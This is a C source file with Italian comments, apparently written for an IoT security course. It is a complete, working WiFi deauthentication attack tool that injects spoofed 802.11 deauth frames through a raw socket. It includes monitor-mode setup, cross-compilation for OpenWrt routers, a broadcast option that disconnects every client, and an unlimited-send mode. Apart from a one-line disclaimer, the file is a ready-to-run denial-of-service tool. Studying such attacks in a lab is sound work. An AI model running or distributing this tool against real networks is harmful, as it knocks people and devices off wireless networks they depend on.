/*
 * deauth.c — Invio di frame 802.11 Deauthentication via raw socket
 *
 * Questo programma utilizza AF_PACKET con raw socket per iniettare
 * frame di deauthentication WiFi 802.11 tramite un'interfaccia in
 * monitor mode. Non richiede librerie esterne (no libpcap), quindi
 * può girare su router con Linux embedded (es. OpenWrt).
 *
 * PREREQUISITI:
 *   1. L'interfaccia WiFi deve essere in monitor mode:
 *        ip link set wlan0 down
 *        iw dev wlan0 set type monitor
 *        ip link set wlan0 up
 *      oppure creare un'interfaccia monitor separata:
 *        iw dev wlan0 interface add mon0 type monitor
 *        ip link set mon0 up
 *
 *   2. Compilazione (sul router o cross-compilazione):
 *        gcc -o deauth deauth.c
 *      oppure con il toolchain del router, es:
 *        mipsel-openwrt-linux-gcc -o deauth deauth.c
 *
 *   3. Esecuzione (richiede root):
 *        ./deauth [--no-radiotap] <interfaccia> <bssid_ap> <mac_client> [num_pacchetti]
 *      Esempio (mac80211, es. PC con Realtek/Intel):
 *        ./deauth mon0 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 50
 *      Esempio (madwifi/Atheros, es. router con ath_dev):
 *        ./deauth --no-radiotap ath1 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 50
 *
 * NOTA: Questo programma è esclusivamente a scopo didattico/di ricerca
 *       nell'ambito di un corso di IoT Security. L'uso su reti senza
 *       autorizzazione è illegale.
 */

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

/* ---------- Radiotap header ----------
 * Header minimo richiesto per l'iniezione di frame 802.11.
 * Il driver WiFi lo usa per capire i parametri di trasmissione.
 * Questo header minimale dice al driver: "usa i tuoi default".
 */
static const unsigned char radiotap_header[] = {
    0x00, 0x00,            /* versione radiotap */
    0x08, 0x00,            /* lunghezza header (8 byte) */
    0x00, 0x00, 0x00, 0x00 /* bitmask present flags: nessun campo extra */
};

/* ---------- Struttura frame Deauthentication 802.11 ----------
 *
 * Un frame di deauth è un frame di management (tipo 0, sottotipo 12).
 * La struttura è:
 *   [Radiotap Header]  — per il driver
 *   [Frame Control]    — 2 byte: tipo/sottotipo del frame
 *   [Duration]         — 2 byte: solitamente 0
 *   [Addr1]            — 6 byte: indirizzo destinazione (client)
 *   [Addr2]            — 6 byte: indirizzo sorgente (AP / chi manda)
 *   [Addr3]            — 6 byte: BSSID
 *   [Seq Control]      — 2 byte: sequence number
 *   [Reason Code]      — 2 byte: motivo della deautenticazione
 */

/* Reason codes comuni per la deauth (802.11 standard) */
#define REASON_UNSPECIFIED 1
#define REASON_PREV_AUTH_INVALID 2
#define REASON_LEAVING 3
#define REASON_INACTIVITY 4
#define REASON_CLASS2_FRAME 6
#define REASON_CLASS3_FRAME 7

/* Offset dei campi nel frame completo (radiotap + 802.11) */
#define RADIOTAP_LEN sizeof(radiotap_header) /* 8 */
#define FC_OFFSET (RADIOTAP_LEN + 0)         /* Frame Control */
#define DUR_OFFSET (RADIOTAP_LEN + 2)        /* Duration */
#define ADDR1_OFFSET (RADIOTAP_LEN + 4)      /* Destination */
#define ADDR2_OFFSET (RADIOTAP_LEN + 10)     /* Source */
#define ADDR3_OFFSET (RADIOTAP_LEN + 16)     /* BSSID */
#define SEQ_OFFSET (RADIOTAP_LEN + 22)       /* Sequence Control */
#define REASON_OFFSET (RADIOTAP_LEN + 24)    /* Reason Code */
#define FRAME_TOTAL_LEN (RADIOTAP_LEN + 26)  /* Lunghezza totale */

/*
 * parse_mac - Converte una stringa MAC "AA:BB:CC:DD:EE:FF" in 6 byte.
 * Ritorna 0 in caso di successo, -1 in caso di errore.
 */
static int parse_mac(const char *str, unsigned char mac[6]) {
  unsigned int tmp[6];
  if (sscanf(str, "%02x:%02x:%02x:%02x:%02x:%02x", &tmp[0], &tmp[1], &tmp[2],
             &tmp[3], &tmp[4], &tmp[5]) != 6) {
    return -1;
  }
  for (int i = 0; i < 6; i++)
    mac[i] = (unsigned char)tmp[i];
  return 0;
}

/*
 * build_deauth_frame - Costruisce il frame di deauth completo.
 *
 * @buf:      buffer di output (deve essere >= FRAME_TOTAL_LEN byte)
 * @bssid:    MAC address dell'Access Point
 * @client:   MAC address del client da disconnettere
 * @reason:   codice motivo della deautenticazione
 * @seq:      sequence number del frame
 */
static void build_deauth_frame(unsigned char *buf, const unsigned char bssid[6],
                               const unsigned char client[6],
                               unsigned short reason, unsigned short seq) {
  memset(buf, 0, FRAME_TOTAL_LEN);

  /* 1. Radiotap header */
  memcpy(buf, radiotap_header, RADIOTAP_LEN);

  /* 2. Frame Control: Management frame, sottotipo Deauthentication
   *    Tipo = 0 (management), Sottotipo = 12 (deauth)
   *    Frame Control = 0x00C0
   *    Byte 0: sottotipo(4bit)|tipo(2bit)|versione(2bit) = 1100|00|00 = 0xC0
   *    Byte 1: flags = 0x00
   */
  buf[FC_OFFSET] = 0xC0;
  buf[FC_OFFSET + 1] = 0x00;

  /* 3. Duration (0 = gestito dal firmware/driver) */
  buf[DUR_OFFSET] = 0x00;
  buf[DUR_OFFSET + 1] = 0x00;

  /* 4. Address 1 (Destination): il client da disconnettere */
  memcpy(buf + ADDR1_OFFSET, client, 6);

  /* 5. Address 2 (Source): l'AP (spoofato) */
  memcpy(buf + ADDR2_OFFSET, bssid, 6);

  /* 6. Address 3 (BSSID): l'AP */
  memcpy(buf + ADDR3_OFFSET, bssid, 6);

  /* 7. Sequence Control: sequence number << 4 (i primi 4 bit sono il
   *    fragment number, che per i frame di management è sempre 0) */
  unsigned short seq_ctrl = (seq & 0x0FFF) << 4;
  buf[SEQ_OFFSET] = seq_ctrl & 0xFF;
  buf[SEQ_OFFSET + 1] = (seq_ctrl >> 8) & 0xFF;

  /* 8. Reason Code (little-endian) */
  buf[REASON_OFFSET] = reason & 0xFF;
  buf[REASON_OFFSET + 1] = (reason >> 8) & 0xFF;
}

/*
 * get_ifindex - Ottiene l'indice dell'interfaccia di rete dal nome.
 */
static int get_ifindex(int sockfd, const char *ifname) {
  struct ifreq ifr;
  memset(&ifr, 0, sizeof(ifr));
  strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

  if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
    perror("ioctl(SIOCGIFINDEX)");
    return -1;
  }
  return ifr.ifr_ifindex;
}

static void print_usage(const char *progname) {
  fprintf(
      stderr,
      "Uso: %s [--no-radiotap] <interfaccia> <bssid_ap> <mac_client> [num_pacchetti]\n"
      "\n"
      "Opzioni:\n"
      "  --no-radiotap  Non anteporre il radiotap header al frame.\n"
      "                 Necessario su driver madwifi/Atheros (es. ath_dev)\n"
      "                 che si aspettano frame 802.11 nudi per l'iniezione.\n"
      "                 Non usare su driver mac80211 (es. Realtek, Intel).\n"
      "\n"
      "Argomenti:\n"
      "  interfaccia    Interfaccia WiFi in monitor mode (es: mon0, ath1)\n"
      "  bssid_ap       MAC dell'Access Point (es: AA:BB:CC:DD:EE:FF)\n"
      "  mac_client     MAC del client da disconnettere\n"
      "                 Usa FF:FF:FF:FF:FF:FF per broadcast (tutti i client)\n"
      "  num_pacchetti  Numero di frame da inviare (default: 10)\n"
      "\n"
      "Esempi:\n"
      "  %s mon0 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 50\n"
      "  %s --no-radiotap ath1 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 50\n"
      "\n"
      "NOTA: L'interfaccia deve essere in monitor mode.\n"
      "  ip link set wlan0 down\n"
      "  iw dev wlan0 set type monitor\n"
      "  ip link set wlan0 up\n",
      progname, progname, progname);
}

int main(int argc, char *argv[]) {
  int no_radiotap = 0;
  int arg_start = 1; /* indice del primo argomento posizionale */

  /* Controlla il flag --no-radiotap (deve essere il primo argomento) */
  if (argc >= 2 && strcmp(argv[1], "--no-radiotap") == 0) {
    no_radiotap = 1;
    arg_start = 2;
  }

  /* Servono almeno 3 argomenti posizionali: interfaccia, bssid, mac_client */
  if (argc - arg_start < 3) {
    print_usage(argv[0]);
    return EXIT_FAILURE;
  }

  const char *ifname = argv[arg_start];
  unsigned char bssid[6];
  unsigned char client[6];
  int num_packets = 10;

  /* Parse BSSID dell'AP */
  if (parse_mac(argv[arg_start + 1], bssid) < 0) {
    fprintf(stderr, "Errore: BSSID non valido: %s\n", argv[arg_start + 1]);
    return EXIT_FAILURE;
  }

  /* Parse MAC del client */
  if (parse_mac(argv[arg_start + 2], client) < 0) {
    fprintf(stderr, "Errore: MAC client non valido: %s\n", argv[arg_start + 2]);
    return EXIT_FAILURE;
  }

  /* Numero di pacchetti (opzionale) */
  if (argc - arg_start >= 4) {
    num_packets = atoi(argv[arg_start + 3]);
    if (num_packets < 0) {
      fprintf(stderr,
              "Errore: numero di pacchetti non valido (deve essere >= 0): %s\n",
              argv[arg_start + 3]);
      return EXIT_FAILURE;
    }
  }

  /* ---- Creazione del raw socket ----
   * AF_PACKET:  accesso diretto al livello 2 (link layer)
   * SOCK_RAW:   pacchetti completi con header
   * ETH_P_ALL:  riceviamo/inviamo tutti i protocolli
   *
   * Questa è l'unica API necessaria: fa parte del kernel Linux
   * e non richiede librerie aggiuntive.
   */
  int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (sockfd < 0) {
    perror("socket(AF_PACKET, SOCK_RAW)");
    if (errno == EPERM)
      fprintf(stderr, "Hint: serve eseguire come root (sudo).\n");
    return EXIT_FAILURE;
  }

  /* Ottieni l'indice dell'interfaccia */
  int ifindex = get_ifindex(sockfd, ifname);
  if (ifindex < 0) {
    fprintf(stderr, "Errore: interfaccia '%s' non trovata.\n", ifname);
    close(sockfd);
    return EXIT_FAILURE;
  }

  /* Configura l'indirizzo per l'invio */
  struct sockaddr_ll sll;
  memset(&sll, 0, sizeof(sll));
  sll.sll_family = AF_PACKET;
  sll.sll_ifindex = ifindex;
  sll.sll_protocol = htons(ETH_P_ALL);

  printf("=== Deauth Attack Tool (solo uso didattico) ===\n");
  printf("Interfaccia : %s (index %d)\n", ifname, ifindex);
  printf("Radiotap    : %s\n", no_radiotap ? "NO (raw 802.11, madwifi)" : "SI (mac80211)");
  printf("BSSID (AP)  : %02X:%02X:%02X:%02X:%02X:%02X\n", bssid[0], bssid[1],
         bssid[2], bssid[3], bssid[4], bssid[5]);
  printf("Client      : %02X:%02X:%02X:%02X:%02X:%02X\n", client[0], client[1],
         client[2], client[3], client[4], client[5]);
  printf("Pacchetti   : %d\n", num_packets);
  printf("Reason code : %d (REASON_UNSPECIFIED)\n\n", REASON_UNSPECIFIED);

  /* ---- Invio dei frame ---- */
  unsigned char frame[FRAME_TOTAL_LEN];
  int sent = 0;
  int failed = 0;

  for (int i = 0; num_packets == 0 || i < num_packets; i++) {
    /* Costruisci il frame con sequence number incrementale */
    build_deauth_frame(frame, bssid, client, REASON_UNSPECIFIED,
                       (unsigned short)i);

    /* Invia il frame raw sull'interfaccia.
     * Su mac80211: il frame completo con radiotap header.
     * Su madwifi:  solo il frame 802.11 nudo (senza radiotap). */
    unsigned char *send_buf = no_radiotap ? frame + RADIOTAP_LEN : frame;
    size_t send_len = no_radiotap ? FRAME_TOTAL_LEN - RADIOTAP_LEN : FRAME_TOTAL_LEN;
    ssize_t ret = sendto(sockfd, send_buf, send_len, 0,
                         (struct sockaddr *)&sll, sizeof(sll));

    if (ret < 0) {
      perror("sendto");
      failed++;
    } else {
      sent++;
      if (num_packets == 0) {
        printf("\r[%d/infinito] Frame deauth inviati...", sent);
      } else {
        printf("\r[%d/%d] Frame deauth inviati...", sent, num_packets);
      }
      fflush(stdout);
    }

    /* Piccolo delay per non saturare il driver (10ms) */
    usleep(10000);
  }

  printf("\n\nCompletato: %d inviati, %d falliti.\n", sent, failed);

  close(sockfd);
  return EXIT_SUCCESS;
}
